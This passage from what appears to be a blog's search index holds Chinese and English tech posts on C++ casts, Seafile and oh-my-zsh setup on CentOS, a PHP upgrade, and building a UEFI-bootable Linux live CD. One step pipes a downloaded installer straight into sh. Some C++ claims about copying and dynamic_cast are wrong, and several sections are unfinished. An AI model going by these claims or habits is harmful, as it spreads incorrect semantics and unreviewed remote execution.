class=\"keyword\">float</span> f = <span class=\"number\">3.14</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span>* ptr = &amp;i;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> ci = <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">const</span> <span class=\"keyword\">int</span>&gt;(i);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ici = <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">int</span>&gt;(ci);</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">float</span>&gt;(i) &lt;&lt; std::endl;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">int</span>&gt;(f) &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"comment\">// std::cout &lt;&lt; static_cast&lt;int*&gt;(i) &lt;&lt; std::endl; // compile error</span></span><br><span class=\"line\">    <span class=\"comment\">// std::cout &lt;&lt; static_cast&lt;int&gt;(ptr) &lt;&lt; std::endl; // compile error</span></span><br><span class=\"line\"></span><br><span class=\"line\">    Base base;</span><br><span class=\"line\">    Derive derive;  </span><br><span class=\"line\">    <span class=\"comment\">// Derive derive2 = static_cast&lt;Derive&gt;(base); // compile error</span></span><br><span class=\"line\">    Base base2 = <span class=\"keyword\">static_cast</span>&lt;Base&gt;(derive);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">3</span><br><span class=\"line\">Base construct</span><br><span class=\"line\">Base construct</span><br><span class=\"line\">Derive construct</span><br><span class=\"line\">Base copy construct</span><br></pre></td></tr></table></figure><br>对于上述例子，可以看出多态场景下<strong>派生类向基类值的转换涉及到拷贝构造，将会以派生类中基类的数据为参调用基类的拷贝构造函数构造一个新对象</strong>。对于基础类型的转化也是<strong>基于复制</strong>的，会分配新的栈上空间。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">Derive derive;</span><br><span class=\"line\"><span class=\"keyword\">const</span> Base&amp; baseref1 = <span class=\"keyword\">static_cast</span>&lt;Base&amp;&gt;(derive); <span class=\"comment\">// no copy construct happened</span></span><br><span class=\"line\">Base&amp; basevalue = <span class=\"keyword\">static_cast</span>&lt;Base&amp;&gt;(derive); <span class=\"comment\">// copy construct happened</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Base&amp; baseref2 = <span class=\"keyword\">static_cast</span>&lt;Base&gt;(derive); <span class=\"comment\">// copy construct happened</span></span><br></pre></td></tr></table></figure>\n<p>转化类型是否涉及拷贝取决于转化后的目标是否占用新的栈上空间。如果转化后的值需要占用栈上空间，或者转化目标不是引用或指针，则会发生拷贝构造。<strong>如果不想发生拷贝构造，可以使用<code>dynamic_cast</code>。</strong></p>\n<h2 id=\"dynamic-cast\"><a href=\"#dynamic-cast\" class=\"headerlink\" title=\"dynamic_cast\"></a>dynamic_cast</h2><p><code>dynamic_cast&lt;T*&gt;</code>用于动态类型转换，<strong>只能用于含有虚函数的类</strong>，用于类层次之间的向上和向下转换，<strong>只能转指针或引用</strong>（所以转化过程不会设计拷贝构造），<strong>如果是非法的对于指针返回NULL，对于引用抛异常</strong>。<code>dynamic_cast</code>的检测发生在运行时，需要检查虚表判断是否能够向下转换。</p>\n<p>最为严格的强制转换，只能进行指针或者引用类型转换，而且要求满足转换安全。即<strong>只允许派生类类型向基类类型转换，否则抛出异常</strong></p>\n<p><code>dynamic_cast</code>使用了RTTI(RunTime Type Indentify)来检查类指针/引用的派生关系。RTTI提供了3个主要的操作符：</p>\n<ul>\n<li><code>dynamic_cast</code></li>\n<li><code>typeid</code></li>\n<li><code>type_info</code></li>\n</ul>\n<p>当typeid中的操作数是如下情况之一时，typeid运算符指出操作数的静态类型，即编译时的类型。</p>\n<ol>\n<li>类型名</li>\n<li>一个基本类型的变量</li>\n<li>一个具体的对象(非指针对象)</li>\n<li>一个指向不含有virtual函数的类对象的指针的解引用</li>\n<li>一个指向不含有virtual函数的类对象的引用</li>\n</ol>\n<p>静态类型在程序的运行过程中并不会改变，所以并不需要在程序运行时计算类型，在编译时就能根据操作数的静态类型，推导出其类型信息。例如如下的代码片断，typeid中的操作数均为静态类型：</p>\n<h2 id=\"dynamic-pointer-cast\"><a href=\"#dynamic-pointer-cast\" class=\"headerlink\" title=\"dynamic_pointer_cast\"></a>dynamic_pointer_cast</h2><h2 id=\"lexical-cast\"><a href=\"#lexical-cast\" class=\"headerlink\" title=\"lexical_cast\"></a>lexical_cast</h2><h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.csdn.net/m0_46210273/article/details/121147406\">C++ 四种cast 详解</a></li>\n<li><a href=\"https://blog.csdn.net/jiaomubai/article/details/99689461\">C++四种cast及其使用</a></li>\n<li><a href=\"https://blog.csdn.net/k6604125/article/details/126524992\">https://blog.csdn.net/k6604125/article/details/126524992</a></li>\n<li><a href=\"https://stackoverflow.com/questions/26413951/overloaded-bool-string-ambiguity\">https://stackoverflow.com/questions/26413951/overloaded-bool-string-ambiguity</a></li>\n<li><a href=\"https://www.codeproject.com/Questions/5348060/Cplusplus-string-constructor-why-bool-treated-as-c\">https://www.codeproject.com/Questions/5348060/Cplusplus-string-constructor-why-bool-treated-as-c</a></li>\n</ul>\n","tags":["CPP"]},{"title":"CentOS搭建自己的云盘服务器","url":"/2017/10/07/CentOS%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%91%E7%9B%98%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"<h2 id=\"更新你的-CentOS-系统\"><a href=\"#更新你的-CentOS-系统\" class=\"headerlink\" title=\"更新你的 CentOS 系统\"></a>更新你的 CentOS 系统</h2><p>为了系统更加稳定，将系统更新更新<br>更新完后将系统进行重启，下面命令已加入重启命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install epel-release</span><br><span class=\"line\">sudo yum update -y &amp;&amp; sudo reboot</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装依赖环境\"><a href=\"#安装依赖环境\" class=\"headerlink\" title=\"安装依赖环境\"></a>安装依赖环境</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install python python-setuptools python-imaging python-ldap python-memcached MySQL-python mariadb mariadb-server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接下来，启动其中的 MariaDB 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start mariadb.service</span><br><span class=\"line\">sudo systemctl enable mariadb.service</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>接下来安装 MySQL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/mysql_secure_installation</span><br></pre></td></tr></table></figure>\n<h2 id=\"下载并解压缩-Seafile-服务器端\"><a href=\"#下载并解压缩-Seafile-服务器端\" class=\"headerlink\" title=\"下载并解压缩 Seafile 服务器端\"></a>下载并解压缩 Seafile 服务器端</h2><p>下载并解压最新版本的 Seafile 服务器存档（目前最新版为 5.1.4 ）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd </span><br><span class=\"line\">wget https://bintray.com/artifact/download/seafile-org/seafile/seafile-server_5.1.4_x86-64.tar.gz</span><br></pre></td></tr></table></figure>\n<p>解压和安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar -zxvf seafile-server_5.1.4_x86-64.tar.gz</span><br><span class=\"line\">sudo mkdir -p /opt/seafile/installed</span><br><span class=\"line\">sudo mv seafile-server_5.1.4_x86-64.tar.gz /opt/seafile/installed</span><br><span class=\"line\">sudo mv seafile-server-5.1.4/ /opt/seafile</span><br><span class=\"line\">cd /opt/seafile/seafile-server-5.1.4</span><br><span class=\"line\">sudo ./setup-seafile-mysql.sh</span><br></pre></td></tr></table></figure>\n<p>运行下面命令启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo ./seafile.sh start</span><br><span class=\"line\">sudo ./seahub.sh start</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改防火墙规则\"><a href=\"#修改防火墙规则\" class=\"headerlink\" title=\"修改防火墙规则\"></a>修改防火墙规则</h2><p>为了允许 Seafile 服务端和客户端之间的 Web 访问和文件同步，使用以下命令修改防火墙规则：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo firewall-cmd --zone=public --permanent --add-port=8082/tcp</span><br><span class=\"line\">sudo firewall-cmd --zone=public --permanent --add-port=8000/tcp</span><br><span class=\"line\">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n<p>打开浏览器查看成果</p>\n<p><code>http://&lt;这里输入你们服务器公网 ip&gt;:8000</code></p>\n","tags":["Linux"]},{"title":"CentOS配置oh-my-zsh","url":"/2017/10/05/CentOS%E9%85%8D%E7%BD%AEoh-my-zsh/","content":"<p>使用root用户登录，下面的操作基本都没有root的困扰，如果非root用户请切换至root用户操作。<br>1、查看系统当前的shell<br><code>echo $SHELL</code><br>返回结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>2、查看bin下是否有zsh包<br><code>cat /etc/shells</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/sh</span><br><span class=\"line\">/bin/bash</span><br><span class=\"line\">/sbin/nologin</span><br><span class=\"line\">/bin/dash</span><br><span class=\"line\">/bin/tcsh</span><br><span class=\"line\">/bin/csh</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p>3、安装zsh包<br><code>yum -y install zsh</code><br>安装完成后查看shell列表：<br><code>cat /etc/shells</code><br>返回结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/sh</span><br><span class=\"line\">/bin/bash</span><br><span class=\"line\">/sbin/nologin</span><br><span class=\"line\">/bin/dash</span><br><span class=\"line\">/bin/tcsh</span><br><span class=\"line\">/bin/csh</span><br><span class=\"line\">/bin/zsh</span><br></pre></td></tr></table></figure><br>现在zsh已经安装完成了，需要把系统默认的shell由bash切换为zsh  </p>\n<p>3、切换shell至zsh，代码如下：<br><code>chsh -s /bin/zsh</code><br>chsh用法请自行查找，返回结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Changing shell for root.</span><br><span class=\"line\">Shell changed.</span><br></pre></td></tr></table></figure><br>按提示所述，shell已经更改为zsh了，现在查看一下系统当前使用的shell，<br><code>echo $SHELL</code><br>返回结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/bash</span><br></pre></td></tr></table></figure><br>看样子还没切换过来，需要重启一下服务器，我的习惯做法是在ECS的web管理平台重启，reboot到底好不好使还没试过，大家可以试试<br>重启过后，使用代码查看当前使用的shell<br><code>echo $SHELL</code><br>返回结果：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/zsh</span><br></pre></td></tr></table></figure><br>得到如此结果，证明shell已经切换成功了。  </p>\n<p>下面开始安装oh-my-zsh<br><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</code><br>如果显示如下界面表示成功：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">         __                                     __   </span><br><span class=\"line\">  ____  / /_     ____ ___  __  __   ____  _____/ /_  </span><br><span class=\"line\"> / __ \\/ __ \\   / __ `__ \\/ / / /  /_  / / ___/ __ \\ </span><br><span class=\"line\">/ /_/ / / / /  / / / / / / /_/ /    / /_(__  ) / / / </span><br><span class=\"line\">\\____/_/ /_/  /_/ /_/ /_/\\__, /    /___/____/_/ /_/  </span><br><span class=\"line\">                        /____/                       ....is now installed!</span><br><span class=\"line\">Please look over the ~/.zshrc file to select plugins, themes, and options.</span><br><span class=\"line\"></span><br><span class=\"line\">p.s. Follow us at https://twitter.com/ohmyzsh.</span><br><span class=\"line\"></span><br><span class=\"line\">p.p.s. Get stickers and t-shirts at http://shop.planetargon.com.</span><br></pre></td></tr></table></figure><br>如果添加插件、更改themes请修改~/.zshrc或自行查询其它资料。<br>至此，zsh安装完毕，开始享受oh-my-zsh吧，如果执行命令时提示warning: cannot set LC_CTYPE locale可用以下方法解决：<br>修改profile：<br><code>vi /etc/profile</code><br>在profile末尾添加以下代码：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">export LC_ALL=en_US.UTF-8</span><br><span class=\"line\">export LC_CTYPE=en_US.UTF-8</span><br></pre></td></tr></table></figure><br>引用更改后的profile：<br><code>source /etc/profile</code><br>此时bash已切换至zsh。  </p>\n","tags":["Linux"]},{"title":"Centos7下php5.4升级php7的方法","url":"/2017/12/25/Centos7%E4%B8%8Bphp5-4%E5%8D%87%E7%BA%A7php7%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>直接通过yum包管理器安装<br><code>yum install php70</code><br>发现报错  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Loaded plugins: fastestmirror  </span><br><span class=\"line\">Loading mirror speeds from cached hostfile  </span><br><span class=\"line\"> * webtatic: us-east.repo.webtatic.com  </span><br><span class=\"line\">Resolving Dependencies  </span><br><span class=\"line\">--&gt; Running transaction check  </span><br><span class=\"line\">---&gt; Package php56w-gd.x86_64 0:5.6.32-1.w7 will be installed  </span><br><span class=\"line\">--&gt; Processing Dependency: php56w-common(x86-64) = 5.6.32-1.w7 for package: php56w-  gd-5.6.32-1.w7.x86_64  </span><br><span class=\"line\">--&gt; Running transaction check  </span><br><span class=\"line\">---&gt; Package php56w-common.x86_64 0:5.6.32-1.w7 will be installed  </span><br><span class=\"line\">--&gt; Processing Conflict: php56w-common-5.6.32-1.w7.x86_64 conflicts php-common &lt; 5.6  </span><br><span class=\"line\">--&gt; Finished Dependency Resolution  </span><br><span class=\"line\">Error: php56w-common conflicts with php-common-5.4.16-43.el7_4.x86_64  </span><br><span class=\"line\"> You could try using --skip-broken to work around the problem  </span><br><span class=\"line\"> You could try running: rpm -Va --nofiles --nodigest</span><br><span class=\"line\">```  </span><br><span class=\"line\">&lt;!-- more --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">发现版本冲突，列出php相关的所有包  </span><br><span class=\"line\">` yum list installed | grep php`  </span><br><span class=\"line\">显示：  </span><br></pre></td></tr></table></figure>\n<p>php-cli.x86_64                       5.4.16-43.el7_4                 @updates<br>php-common.x86_64                    5.4.16-43.el7_4                 @updates<br>php-gd.x86_64                        5.4.16-43.el7_4                 @updates<br>php-imap.x86_64                      5.4.16-7.el7                    @epel<br>php-ldap.x86_64                      5.4.16-43.el7_4                 @updates<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">一一删除之  </span><br><span class=\"line\">`yum remove php-cli.x86_64 `  </span><br><span class=\"line\">`...` </span><br><span class=\"line\"></span><br><span class=\"line\">重新安装  </span><br><span class=\"line\">`yum install php70`  </span><br><span class=\"line\">完成  </span><br></pre></td></tr></table></figure><br> ~ php -v<br>PHP 7.0.25 (cli) (built: Oct 29 2017 13:43:03) ( NTS )<br>Copyright (c) 1997-2017 The PHP Group<br>Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies<br>```</p>\n","tags":["Linux"]},{"title":"Custom your Linux live CD using linux-live","url":"/2024/02/25/Custom-your-Linux-live-CD-with-linux-live/","content":"<p>Recently I was working on a <em>Linux Bare Metal Recovery</em> releated requirement. Users should be allowed to use a customed Linux live CD to start a temporary Linux operating system that won’t make any changes to the storage, and then they can use the build-in tools to perform system recovery, e.g. using <code>sfdisk</code> to restore the volume/partition data and using GRUB toolchains to fix the startup items. Thus, we need to find a way to custom our a Linux recovery live CD firstly.</p>\n<p>Due to I’m a newbie in such area, I googled about the Linux live CD and found there’s already some out-of-the-box images like <a href=\"https://www.slax.org/\">Slax</a>. However, it does not provide the feature customization kit so that does not meet our expectation. I searched linux live kit project from GitHub wishing to found a available solution. The projects are mainly some sorts of shell scripts to pack specified Linux distro into a ISO file.</p>\n<p>I found the <a href=\"https://github.com/Tomas-M/linux-live/blob/master/config\">linux-live</a> project by <a href=\"https://github.com/Tomas-M/linux-live/blob/master/config\">Tomas-M</a> can pack any Linux system whose kernel supports <em>squashfs</em> , <em>aufs</em> and <em>overlayfs</em> into an live CD ISO image. All I need to do is just clone the project, make some configuration and run a script to produce the target ISO, which is quite simple and flexible. Here’s the steps in detail:</p>\n<ol>\n<li><p>clone the project to a directory that won’t be packed latter, for example <code>/opt</code>.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cd</span> /opt &amp;&amp; git <span class=\"built_in\">clone</span> https://github.com/Tomas-M/linux-live.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>edit the <code>linux-live/config</code> file to filter which directories need to be packed:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Kernel file, will be copied to your Live Kit</span><br><span class=\"line\"># Your kernel must support aufs and squashfs. Debian Jessie&#x27;s kernel is ready</span><br><span class=\"line\"># out of the box.</span><br><span class=\"line\">VMLINUZ=/vmlinuz</span><br><span class=\"line\"></span><br><span class=\"line\"># List of directories for root filesystem</span><br><span class=\"line\"># No subdirectories are allowed, no slashes,</span><br><span class=\"line\"># so You can&#x27;t use /var/tmp here for example</span><br><span class=\"line\"># Exclude directories like proc sys tmp</span><br><span class=\"line\">MKMOD=&quot;bin etc home lib lib64 libx32 root sbin srv usr var&quot;</span><br></pre></td></tr></table></figure>\n<p>use <code>find /boot | grep vmlinuz</code> to find where the <em>vmlinuz</em> image is and create a <code>/vmlinuz</code> symlink to that path:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ find /boot | grep vmlinuz</span><br><span class=\"line\">/boot/vmlinuz-0-rescue-2348d36f53074ace8b9850051a3d34b5</span><br><span class=\"line\">/boot/vmlinuz-5.10.0-182.0.0.95.oe2203sp3.x86_64</span><br><span class=\"line\">$ ln -s /boot/vmlinuz-5.10.0-182.0.0.95.oe2203sp3.x86_64 /vmlinuz</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<span id=\"more\"></span>\n<ol>\n<li><p>run <code>linux-live/build</code> script, a temporary folder named <code>linux-data-xxx</code> containning data to be packed and two shell scripts that used to produce ISO or ZIP file will be generated to <code>/tmp</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree /tmp</span><br><span class=\"line\">/tmp</span><br><span class=\"line\">  |-- /linux-data-xxxx</span><br><span class=\"line\">  |-- gen_linux_iso.sh</span><br><span class=\"line\">  |-- gen_linux_zip.sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>run <code>/tmp/gen_linux_iso.sh</code> and an ISO image <code>/tmp/linux-x86_64.iso</code> will be packed.</p>\n</li>\n</ol>\n<p>After the four simple steps are done, I created a new virtual machine in VMWare, attached this ISO image to virtual CD-ROM and chose to boot from CD-ROM. It works! A ugly boot background shows and the systems loads successfully!</p>\n<p><img src=\"live-linux-isolinux.png\" alt=\"live-linux-isolinux\"></p>\n<p>However, several days later, I found that the ISO cannot boot on UEFI mode (the previous vm is booted from BIOS). What’s worse, the <a href=\"https://github.com/Tomas-M/linux-live\">linux-live</a> kit cannot build ISO image from aarch64 platform. I checked the build log and found it output error when executing <code>initramfs_create</code>. It fails because the build scripts require some pre-compiled binaries like <code>busybox</code>, <code>eject</code>, <code>mkfs.xfs</code> placed in directory <code>initramfs/static</code>. Thus, this kit won’t work on such case definitely without performing any modification to it! Now, to sum up, this live kit can only produce ISO image which works on x86_64 platform and support BIOS booting only, but our requirement is to build ISO image that works on both x86_64 and aarch64, and can boot from both UEFI and BIOS. I think, the binaries platform issue can solved by recompiling them on aarch64 platform, but the UEFI booting issue is really hard for me since I have no idea about how Linux boots from ISO! </p>\n<p>I have written a blog <em><a href=\"/2024/02/25/How-Linux-Boots/\">How Linux Boots</a></em> introducing how Linux boot from disk, but this time things got a little different as we are trying to boot from ISO image, or say, a optical disk.</p>\n<h2 id=\"ISOLINUX-amp-GRUB\"><a href=\"#ISOLINUX-amp-GRUB\" class=\"headerlink\" title=\"ISOLINUX &amp; GRUB\"></a>ISOLINUX &amp; GRUB</h2><p>// isolinux is designed for ISO boot specificly<br><img src=\"qemu-euler-aarch64-install.png\" alt=\"qemu-euler-aarch64-install\"><br><img src=\"virt-manager-create-new-instance.png\" alt=\"virt-manager-create-new-instance\"><br><img src=\"live-linux-grub.png\" alt=\"live-linux-grub\"></p>\n<h2 id=\"ISO9660-amp-El-Torito\"><a href=\"#ISO9660-amp-El-Torito\" class=\"headerlink\" title=\"ISO9660 &amp; El Torito\"></a>ISO9660 &amp; El Torito</h2><p>// iso8660 standard and El Torito boot</p>\n<h2 id=\"Build-x86-64-EFI-ISO-image\"><a href=\"#Build-x86-64-EFI-ISO-image\" class=\"headerlink\" title=\"Build x86_64 EFI ISO image\"></a>Build x86_64 EFI ISO image</h2><p>// replace ESP image and El torito boot entry</p>\n<p>// build hybrid CD</p>\n<p>I downloaded a <code>openEuler-22.03-LTS-SP3-x86_64-dvd.iso</code> installation ISO file and mounted it as <code>iso9660</code> filesystem to check it’s structure as followed:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ mkdir /mnt/sr0</span><br><span class=\"line\">$ mount -t iso9660 -o loop,ro openEuler-22.03-LTS-SP3-x86_64-dvd.iso /mnt/sr0</span><br><span class=\"line\">$ tree /mnt/sr0</span><br><span class=\"line\">/mnt/sr0/</span><br><span class=\"line\">├── EFI</span><br><span class=\"line\">│   ├── BOOT</span><br><span class=\"line\">│   │   ├── BOOTX64.EFI</span><br><span class=\"line\">│   │   ├── fonts</span><br><span class=\"line\">│   │   │   ├── TRANS.TBL</span><br><span class=\"line\">│   │   │   └── unicode.pf2</span><br><span class=\"line\">│   │   ├── grub.cfg</span><br><span class=\"line\">│   │   ├── grubx64.efi</span><br><span class=\"line\">│   │   ├── mmx64.efi</span><br><span class=\"line\">│   │   └── TRANS.TBL</span><br><span class=\"line\">│   └── TRANS.TBL</span><br><span class=\"line\">├── images</span><br><span class=\"line\">│   ├── efiboot.img</span><br><span class=\"line\">│   ├── install.img</span><br><span class=\"line\">│   ├── pxeboot</span><br><span class=\"line\">│   │   ├── initrd.img</span><br><span class=\"line\">│   │   ├── TRANS.TBL</span><br><span class=\"line\">│   │   └── vmlinuz</span><br><span class=\"line\">│   └── TRANS.TBL</span><br><span class=\"line\">├── isolinux</span><br><span class=\"line\">│   ├── boot.cat</span><br><span class=\"line\">│   ├── boot.msg</span><br><span class=\"line\">│   ├── grub.conf</span><br><span class=\"line\">│   ├── initrd.img</span><br><span class=\"line\">│   ├── isolinux.bin</span><br><span class=\"line\">│   ├── isolinux.cfg</span><br><span class=\"line\">│   ├── ldlinux.c32</span><br><span class=\"line\">│   ├── libcom32.c32</span><br><span class=\"line\">│   ├── libutil.c32</span><br><span class=\"line\">│   ├── splash.png</span><br><span class=\"line\">│   ├── TRANS.TBL</span><br><span class=\"line\">│   ├── vesamenu.c32</span><br><span class=\"line\">│   └── vmlinuz</span><br><span class=\"line\">├── Packages</span><br><span class=\"line\">├── Repodata</span><br><span class=\"line\">├── docs</span><br></pre></td></tr></table></figure></p>\n<p>We can see except the structure is rather clear:</p>\n<ul>\n<li><code>/isolinux</code> should contains the ISOLINUX bootloader used to enable this ISO image to boot on BIOS mode.</li>\n<li><code>/Packages</code> packed many rpm package that may be used during the installtion.</li>\n<li><code>/EFI</code> contains a hierarchy that look like a ESP partition.</li>\n<li><code>/images</code> contains some disk images.</li>\n</ul>\n<p>It’s notable that and there’s a also image file named <code>efiboot.img</code> placed in <code>/image</code>. By using the <code>file</code> command to check the format of <code>efiboot.img</code>, we can discover it’s a image with <code>vfat</code> format.<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ file /mnt/sr0/images/efiboot.img </span><br><span class=\"line\">/mnt/sr0/images/efiboot.img: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class=\"string\">&quot;mkfs.fat&quot;</span>, sectors/cluster 4, reserved sectors 4, root entries 512, sectors 14336 (volumes &lt;=32 MB), Media descriptor 0xf8, sectors/FAT 12, sectors/track 32, serial number 0xeaba75ff, label: <span class=\"string\">&quot;ANACONDA   &quot;</span>, FAT (12 bit)</span><br></pre></td></tr></table></figure></p>\n<p>Also, I mounted it as a loop device to check what files it contains and got that it nearly process the similar file of <code>/EFI</code>.<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ mkdir /mnt/efiboot</span><br><span class=\"line\">$ mount -o ro,loop /mnt/sr0/images/efiboot.img /mnt/efiboot </span><br><span class=\"line\">$ tree /mnt/efiboot </span><br><span class=\"line\">/mnt/efiboot</span><br><span class=\"line\">└── EFI</span><br><span class=\"line\">    └── BOOT</span><br><span class=\"line\">        ├── BOOTX64.EFI</span><br><span class=\"line\">        ├── fonts</span><br><span class=\"line\">        │   └── unicode.pf2</span><br><span class=\"line\">        ├── grub.cfg</span><br><span class=\"line\">        ├── grubx64.efi</span><br><span class=\"line\">        └── mmx64.efi</span><br><span class=\"line\"></span><br><span class=\"line\">4 directories, 5 files</span><br><span class=\"line\">$ tree /mnt/sr0/EFI                                             </span><br><span class=\"line\">/mnt/sr0/EFI</span><br><span class=\"line\">├── BOOT</span><br><span class=\"line\">│   ├── BOOTX64.EFI</span><br><span class=\"line\">│   ├── fonts</span><br><span class=\"line\">│   │   ├── TRANS.TBL</span><br><span class=\"line\">│   │   └── unicode.pf2</span><br><span class=\"line\">│   ├── grub.cfg</span><br><span class=\"line\">│   ├── grubx64.efi</span><br><span class=\"line\">│   ├── mmx64.efi</span><br><span class=\"line\">│   └── TRANS.TBL</span><br><span class=\"line\">└── TRANS.TBL</span><br><span class=\"line\"></span><br><span class=\"line\">3 directories, 8 files</span><br></pre></td></tr></table></figure></p>\n<p>So I compared the md5 checksum of these files and  find the checksum all matched, this confirmed my hypothesis: the <code>efiboot.img</code> is simply a <code>vfat</code> image packed <code>/EFI</code>. I think the <code>efiboot.img</code> is used to simulate a ESP partition used for UEFI booting.<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ find /mnt/sr0/EFI -<span class=\"built_in\">type</span> f | grep -v TBL | sort | xargs -i md5sum &#123;&#125;</span><br><span class=\"line\">bb78df58c62474ec8596fe0bfd89bab6  /mnt/sr0/EFI/BOOT/BOOTX64.EFI</span><br><span class=\"line\">c6a4d48acacf45900fe9c195ed87e13f  /mnt/sr0/EFI/BOOT/fonts/unicode.pf2</span><br><span class=\"line\">50d210676c58844931553b79ad67870e  /mnt/sr0/EFI/BOOT/grub.cfg</span><br><span class=\"line\">770f6e3f7985f749b26d8fbc306361a7  /mnt/sr0/EFI/BOOT/grubx64.efi</span><br><span class=\"line\">fa13822c2cea99f99b64d81b8ed51918  /mnt/sr0/EFI/BOOT/mmx64.efi</span><br><span class=\"line\">$ find /mnt/efiboot -<span class=\"built_in\">type</span> f | sort | xargs -i md5sum &#123;&#125;       </span><br><span class=\"line\">bb78df58c62474ec8596fe0bfd89bab6  /mnt/efiboot/EFI/BOOT/BOOTX64.EFI</span><br><span class=\"line\">c6a4d48acacf45900fe9c195ed87e13f  /mnt/efiboot/EFI/BOOT/fonts/unicode.pf2</span><br><span class=\"line\">50d210676c58844931553b79ad67870e  /mnt/efiboot/EFI/BOOT/grub.cfg</span><br><span class=\"line\">770f6e3f7985f749b26d8fbc306361a7  /mnt/efiboot/EFI/BOOT/grubx64.efi</span><br><span class=\"line\">fa13822c2cea99f99b64d81b8ed51918  /mnt/efiboot/EFI/BOOT/mmx64.efi</span><br></pre></td></tr></table></figure></p>\n<p>So I copied the <code>efiboot.img</code> from the OpenEuler installation ISO to <code>/tmp/linux-data-xxx/linux/boot</code> in order to boot from this image. Then changed the boot entry from <code>linux/boot/isolinux.bin</code> to <code>linux/boot/efiboot.img</code> and packed the ISO image and reboot from it on UEFI mode again, the GRUB shell prompted succesfully!<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /tmp/linux-data-xxx &amp;&amp; mkisofs -o <span class=\"string\">&quot;/tmp/linux-x86_64-efi.iso&quot;</span></span><br><span class=\"line\">    -v -J -R -D -N --hide-rr-moved -A linux -V linux \\</span><br><span class=\"line\">    -no-emul-boot -boot-info-table -boot-load-size 4 \\</span><br><span class=\"line\">    -b linux/boot/efiboot.img -c linux/boot/isolinux.boot .</span><br></pre></td></tr></table></figure><br>This GRUB bootloader load the <code>grub.cfg</code> from <code>/EFI/BOOT/grub.cfg</code> so I created a directory <code>/EFI/BOOT</code> in the <code>/tmp/linux-data-xxx</code> and configure the <code>grub.cfg</code> in it as follows:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set default=&quot;1&quot;</span><br><span 